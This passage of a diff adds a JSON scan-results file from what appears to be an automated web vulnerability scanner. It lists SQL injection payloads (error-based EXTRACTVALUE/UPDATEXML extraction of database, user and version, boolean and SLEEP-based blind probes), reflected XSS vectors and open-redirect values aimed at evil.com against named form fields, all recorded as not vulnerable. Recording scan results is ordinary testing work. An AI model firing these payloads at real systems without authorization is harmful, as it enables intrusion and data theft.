+      "elapsed": 0.18
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 1987,
+      "false_len": 1987,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_profile_mb"
+  },
+  {
+    "point": "sqli_profile_mb",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_update",
+    "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 1987,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 1987,
+      "false_len": 1987,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_profile_mb"
+  },
+  {
+    "point": "xss_register_name",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "script_basic",
+    "payload": "<script>alert(1)</script>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2209,
+      "elapsed": 0.181
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_register_name"
+  },
+  {
+    "point": "xss_register_name",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "img_onerror",
+    "payload": "<img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2209,
+      "elapsed": 0.182
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_register_name"
+  },
+  {
+    "point": "xss_register_name",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "svg_onload",
+    "payload": "<svg onload=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2209,
+      "elapsed": 0.18
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_register_name"
+  },
+  {
+    "point": "xss_register_name",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "value_breakout",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2209,
+      "elapsed": 0.182
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_register_name"
+  },
+  {
+    "point": "xss_register_name",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "onmouseover",
+    "payload": "\" onmouseover=alert(1) x=\"",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2209,
+      "elapsed": 0.181
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_register_name"
+  },
+  {
+    "point": "open_redirect_login",
+    "vuln_type": "xss_url",
+    "type": "OPEN_REDIRECT",
+    "family": "external_http",
+    "payload": "http://evil.com",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1489,
+      "elapsed": 0.179
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "open_redirect_login"
+  },
+  {
+    "point": "open_redirect_login",
+    "vuln_type": "xss_url",
+    "type": "OPEN_REDIRECT",
+    "family": "external_https",
+    "payload": "https://evil.com",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1489,
+      "elapsed": 0.179
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "open_redirect_login"
+  },
+  {
+    "point": "open_redirect_login",
+    "vuln_type": "xss_url",
+    "type": "OPEN_REDIRECT",
+    "family": "protocol_rel",
+    "payload": "//evil.com",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1489,
+      "elapsed": 0.182
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "open_redirect_login"
+  },
+  {
+    "point": "open_redirect_login",
+    "vuln_type": "xss_url",
+    "type": "OPEN_REDIRECT",
+    "family": "backslash",
+    "payload": "\\\\evil.com",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 3656,
+      "elapsed": 0.182
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "open_redirect_login"
+  },
+  {
+    "point": "open_redirect_login",
+    "vuln_type": "xss_url",
+    "type": "OPEN_REDIRECT",
+    "family": "encoded_slash",
+    "payload": "%2F%2Fevil.com",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 3660,
+      "elapsed": 0.181
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "open_redirect_login"
+  },
+  {
+    "point": "open_redirect_login",
+    "vuln_type": "xss_url",
+    "type": "OPEN_REDIRECT",
+    "family": "javascript",
+    "payload": "javascript:alert(document.domain)",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1489,
+      "elapsed": 0.18
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "open_redirect_login"
+  },
+  {
+    "point": "sqli_password_sod",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "true_dquote",
+    "payload": "desc\" AND \"1\"=\"1\" -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sod"
+  },
+  {
+    "point": "sqli_password_sod",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "false_dquote",
+    "payload": "desc\" AND \"1\"=\"2\" -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sod"
+  },
+  {
+    "point": "sqli_password_sod",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "sleep_blind",
+    "payload": "desc\" AND SLEEP(5) AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.183
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sod"
+  },
+  {
+    "point": "sqli_password_sod",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "error_extract",
+    "payload": "desc\" AND EXTRACTVALUE(1,CONCAT(0x7e,database())) AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.184
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sod"
+  },
+  {
+    "point": "sqli_password_sod",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "ascii_blind",
+    "payload": "desc\" AND ASCII(SUBSTRING(database(),1,1))>64 AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.184
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sod"
+  },
+  {
+    "point": "sqli_password_sod",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "length_blind",
+    "payload": "desc\" AND LENGTH(database())>0 AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.183
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sod"
+  },
+  {
+    "point": "sqli_password_sod",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "error_user",
+    "payload": "desc\" AND EXTRACTVALUE(1,CONCAT(0x7e,user())) AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sod"
+  },
+  {
+    "point": "sqli_password_sop",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "true_dquote",
+    "payload": "and\" AND \"1\"=\"1\" -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sop"
+  },
+  {
+    "point": "sqli_password_sop",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "false_dquote",
+    "payload": "and\" AND \"1\"=\"2\" -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sop"
+  },
+  {
+    "point": "sqli_password_sop",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "sleep_blind",
+    "payload": "and\" AND SLEEP(5) AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sop"
+  },
+  {
+    "point": "sqli_password_sop",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "error_extract",
+    "payload": "and\" AND EXTRACTVALUE(1,CONCAT(0x7e,database())) AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sop"
+  },
+  {
+    "point": "sqli_password_sop",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "ascii_blind",
+    "payload": "and\" AND ASCII(SUBSTRING(database(),1,1))>64 AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2917,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2917,
+      "false_len": 2917,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_password_sop"
+  },
+  {
+    "point": "sqli_board_wr_id",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "true_dquote",
+    "payload": "1\" AND \"1\"=\"1\" -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2246,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2246,
+      "false_len": 2246,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_wr_id"
+  },
+  {
+    "point": "sqli_board_wr_id",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "false_dquote",
+    "payload": "1\" AND \"1\"=\"2\" -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2246,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2246,
+      "false_len": 2246,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_wr_id"
+  },
+  {
+    "point": "sqli_board_wr_id",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "numeric_true",
+    "payload": "1 AND 1=1 -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2246,
+      "elapsed": 0.183
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2246,
+      "false_len": 2246,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_wr_id"
+  },
+  {
+    "point": "sqli_board_wr_id",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "numeric_false",
+    "payload": "1 AND 1=2 -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2246,
+      "elapsed": 0.183
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2246,
+      "false_len": 2246,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_wr_id"
+  },
+  {
+    "point": "sqli_board_wr_id",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "sleep_blind",
+    "payload": "1\" AND SLEEP(5) AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2246,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2246,
+      "false_len": 2246,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_wr_id"
+  },
+  {
+    "point": "sqli_board_wr_id",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "error_extract",
+    "payload": "1\" AND EXTRACTVALUE(1,CONCAT(0x7e,database())) AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2246,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2246,
+      "false_len": 2246,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_wr_id"
+  },
+  {
+    "point": "sqli_board_wr_id",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "ascii_blind",
+    "payload": "1\" AND ASCII(SUBSTRING(database(),1,1))>64 AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2246,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2246,
+      "false_len": 2246,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_wr_id"
+  },
+  {
+    "point": "sqli_board_wr_id",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "error_user",
+    "payload": "1\" AND EXTRACTVALUE(1,CONCAT(0x7e,user())) AND \"1\"=\"1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2246,
+      "elapsed": 0.182
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2246,
+      "false_len": 2246,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_wr_id"
+  },
+  {
+    "point": "sqli_qalist_blind",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "true_squote",
+    "payload": "test' AND '1'='1' -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2203,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2203,
+      "false_len": 2203,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_qalist_blind"
+  },
+  {
+    "point": "sqli_qalist_blind",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "false_squote",
+    "payload": "test' AND '1'='2' -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2203,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2203,
+      "false_len": 2203,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_qalist_blind"
+  },
+  {
+    "point": "sqli_qalist_blind",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "tautology_or",
+    "payload": "test' OR '1'='1' -- ",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2203,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2203,
+      "false_len": 2203,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_qalist_blind"
+  },
+  {
+    "point": "sqli_qalist_blind",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "sleep_blind",
+    "payload": "test' AND SLEEP(5)-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2203,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2203,
+      "false_len": 2203,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_qalist_blind"
+  },
+  {
+    "point": "sqli_qalist_blind",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "error_extract",
+    "payload": "test' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2203,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2203,
+      "false_len": 2203,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_qalist_blind"
+  },
+  {
+    "point": "sqli_qalist_blind",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "ascii_blind",
+    "payload": "test' AND ASCII(SUBSTRING(database(),1,1))>64-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2203,
+      "elapsed": 0.18
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2203,
+      "false_len": 2203,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_qalist_blind"
+  },
+  {
+    "point": "sqli_qalist_blind",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "length_blind",
+    "payload": "test' AND LENGTH(database())>0-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2203,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2203,
+      "false_len": 2203,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_qalist_blind"
+  },
+  {
+    "point": "sqli_qalist_blind",
+    "vuln_type": "sqli_boolean",
+    "type": "SQLI_BOOLEAN",
+    "family": "error_user",
+    "payload": "test' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 2203,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 2203,
+      "false_len": 2203,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_qalist_blind"
+  }
+]
